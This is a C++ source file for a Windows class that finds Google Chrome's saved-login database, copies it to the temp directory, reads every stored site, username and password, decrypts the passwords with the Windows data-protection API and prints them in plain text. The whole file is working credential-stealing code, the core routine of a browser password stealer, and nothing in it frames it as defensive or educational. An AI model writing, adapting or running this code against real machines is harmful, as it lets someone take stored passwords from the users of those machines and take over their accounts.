#include "browserinfo.h"
#include "sqlite3.h"
#include <Windows.h>
#include <ShlObj.h>
#include <Shlwapi.h>
#include <iostream>

#pragma comment (lib, "Shlwapi.lib")
#pragma comment(lib, "Crypt32")
using namespace std;

CBrowserInfo::CBrowserInfo()
{

}

CBrowserInfo::~CBrowserInfo()
{

}

void CBrowserInfo::ReadChromeLoginData()
{
	string sLoginDataPath;
	char szPath[MAX_PATH] = {0};
	SHGetSpecialFolderPathA(NULL, szPath, CSIDL_LOCAL_APPDATA, FALSE);
	sLoginDataPath = szPath;
	sLoginDataPath.append("\\Google\\Chrome\\User Data\\Default\\Login Data");

	WIN32_FIND_DATAA FileData = {};
	HANDLE hFindFile = FindFirstFileA(sLoginDataPath.c_str(), &FileData);
	if(hFindFile != INVALID_HANDLE_VALUE)
	{
		FindClose(hFindFile);
	}
	else
	{
		return;
	}

	ReadEncryptData(sLoginDataPath);
}

bool CBrowserInfo::ReadEncryptData(const string &sLoginDataPath)
{
	string sTempPath;
	if (!CopyDataBaseToTempDir(sLoginDataPath, sTempPath))
		return false;

	sqlite3 *pDB = NULL;
	sqlite3_stmt *pStmt = NULL;
	int nSqliteRet;

	string strSql = "select origin_url, username_value, password_value from logins";
	nSqliteRet = sqlite3_open_v2(sTempPath.c_str(), &pDB, SQLITE_OPEN_READWRITE, NULL);
	if (nSqliteRet != SQLITE_OK)
	{
		sqlite3_close(pDB);
		return false;
	}

	nSqliteRet = sqlite3_prepare_v2(pDB, strSql.c_str(), strSql.length(), &pStmt, NULL);
	if (nSqliteRet != SQLITE_OK)
	{
		sqlite3_finalize(pStmt);
		sqlite3_close(pDB);
		return false;
	}

	do
	{
		nSqliteRet = sqlite3_step(pStmt);
		if (nSqliteRet != SQLITE_ROW)
			break;

		string sOriginUrl;
		string sUsername;
		string sPassword;
		sOriginUrl = (char *)sqlite3_column_text(pStmt, 0);
		sUsername = (char *)sqlite3_column_text(pStmt, 1);

		DATA_BLOB dbEncryptedVal;
		dbEncryptedVal.cbData = sqlite3_column_bytes(pStmt, 2);
		dbEncryptedVal.pbData = (BYTE*)sqlite3_column_blob(pStmt, 2);

		DATA_BLOB dbOut;
		if (CryptUnprotectData(&dbEncryptedVal, NULL, NULL, NULL, NULL, 0, &dbOut))
		{
			char *pData = new char[dbOut.cbData + 1];
			memcpy(pData, dbOut.pbData, dbOut.cbData);
			pData[dbOut.cbData] = 0;
			sPassword = pData;
			delete[] pData;
		}

		std::cout << "--------------------------------" << endl;
		std::cout << "ÍøÖ·:" << sOriginUrl << endl;
		std::cout << "ÓÃ»§Ãû:" << sUsername << endl;
		std::cout << "ÃÜÂë:" << sPassword << std::endl;
	} while(true);


	if (pStmt)
	{
		sqlite3_finalize(pStmt);
		pStmt = NULL;
	}
	if (pDB)
	{
		sqlite3_close(pDB);
		pDB = NULL;
	}

	return true;
}

bool CBrowserInfo::CopyDataBaseToTempDir(const std::string &sDBPath, std::string &sTempDBPath)
{
	char chTempPath[MAX_PATH];
	::GetTempPathA(MAX_PATH, chTempPath);
	if (!PathFileExistsA(sDBPath.c_str()))
		return false;

	sTempDBPath = chTempPath;
	if (sTempDBPath.empty())
		return false;

	sTempDBPath.append("chromeTmp");
	if (!CopyFileA(sDBPath.c_str(), sTempDBPath.c_str(), FALSE))
		return false;

	return true;
}